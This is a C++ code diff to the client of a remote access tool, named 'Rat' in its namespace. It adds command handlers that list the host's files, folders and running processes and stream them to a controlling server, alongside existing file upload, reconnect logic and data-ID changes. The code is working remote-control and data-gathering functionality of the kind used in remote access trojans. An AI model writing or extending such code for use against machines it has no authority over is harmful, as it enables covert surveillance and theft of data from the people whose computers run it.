@@ -4,6 +4,8 @@
 #include <random>
 #include <fstream>
 #include "FileSender.hpp"
+#include "ProcessUtils.hpp"
+#include "FileFolderUtils.hpp"
 #include "Utils.hpp"
 namespace Rat 
 {
@@ -129,7 +131,7 @@ namespace Rat
             packet.set_destination_id("server_0");
             packet.set_encrypted(true);
             auto* chunked = packet.mutable_chunked_data();
-            chunked->set_data_id("STATIC_ID_" + std::to_string(std::rand()));
+            chunked->set_data_id("STATIC_ID_" + Utils::getCurrentTimeString() + std::to_string(std::rand()));
             chunked->set_sequence_number(0);
             chunked->set_total_chunks(1);
             chunked->set_payload("-1");
@@ -148,7 +150,7 @@ namespace Rat
             packet.set_destination_id("server_0");
             packet.set_encrypted(true);
             auto* chunked = packet.mutable_chunked_data();
-            chunked->set_data_id("STATIC_ID_" + std::to_string(std::rand()));
+            chunked->set_data_id("STATIC_ID_" + Utils::getCurrentTimeString() + std::to_string(std::rand()));
             chunked->set_sequence_number(0);
             chunked->set_total_chunks(1);
             chunked->set_payload(std::to_string(this_id_));
@@ -194,6 +196,14 @@ namespace Rat
                         if (current_file_sender_) 
                         {
                             current_file_sender_.reset(); 
+                        }
+                        if (current_process_sender_)
+                        {
+                            current_process_sender_.reset();
+                        }
+                        if (current_file_folder_sender_)
+                        {
+                            current_file_folder_sender_.reset();
                         }
                         if (socket_) 
                         {
@@ -248,7 +258,7 @@ namespace Rat
                             current_file_sender_ = std::make_shared<FileSender>(socket_, networkManager_, this_id_, packet.file_path());
                             current_file_sender_->sendFile(
                                 packet.file_path(),
-                                Utils::getCurrentTimeString(),
+                                Utils::getCurrentTimeString() + std::to_string(this_id_),
                                 [this]() {
                                     std::cout << "File transfer completed.\n";
                                     handleCommands();
@@ -275,14 +285,67 @@ namespace Rat
                         {    
                             std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
                             std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
-                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
-                            break; 
+                            // note check if path/level = packet.chunked_data().payload() not ok before listFilesFolders 
+                            std::string file_folder_data = FileFolderUtils::listFilesFolders(packet.chunked_data().payload()); 
+                            std::cout << "Debug size of file/folder list: " << file_folder_data.size() << std::endl;
+
+                            current_file_folder_sender_ = std::make_shared<FileFolderSender>(socket_, networkManager_, this_id_, file_folder_data);
+                            current_file_folder_sender_->sendFileFolders(
+                                "LIST_FILES_FOLDERS_" + Utils::getCurrentTimeString() + std::to_string(this_id_),
+                                [this]()
+                                {
+                                    std::cout << "File/folder list transfer completed.\n";
+                                    handleCommands();
+                                },
+                                [this]()
+                                {
+                                    std::cout << "Connection lost during file/folder transfer, scheduling reconnect...\n";
+                                    if (current_file_folder_sender_)
+                                    {
+                                        current_file_folder_sender_.reset();
+                                    }
+                                    if (socket_)
+                                    {
+                                        socket_->lowest_layer().close();
+                                        socket_.reset();
+                                    }
+                                    scheduleReconnect();
+                                }
+                            );
+                            break;
                         }
                         case rat::Packet::LIST_PROCESSES:
                         {  
+                            std::cout << "COMMAND TYPE FROM SERVER: " << packet.type() << std::endl;
+                            std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
 
-                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
-                            break;
+                            // Get process list
+                            std::string process_data = formatProcessList(listProcesses());
+                            std::cout << "Debug size: " << process_data << std::endl;
+                            current_process_sender_ = std::make_shared<ProcessSender>(socket_, networkManager_, this_id_, process_data);
+                            current_process_sender_->sendProcesses(
+                                "LIST_PROCESS_" + Utils::getCurrentTimeString() + std::to_string(this_id_),
+                                [this]()
+                                {
+                                    std::cout << "Process list transfer completed.\n";
+                                    handleCommands();
+                                },
+                                [this]()
+                                {
+                                    std::cout << "Connection lost during process transfer, scheduling reconnect...\n";
+                                    if (current_process_sender_)
+                                    {
+                                        current_process_sender_.reset();
+                                    }
+                                    if (socket_)
+                                    {
+                                        socket_->lowest_layer().close();
+                                        socket_.reset();
+                                    }
+                                    scheduleReconnect();
+                                }
+                            );
+                            return;
                         }
                         default:
                         {
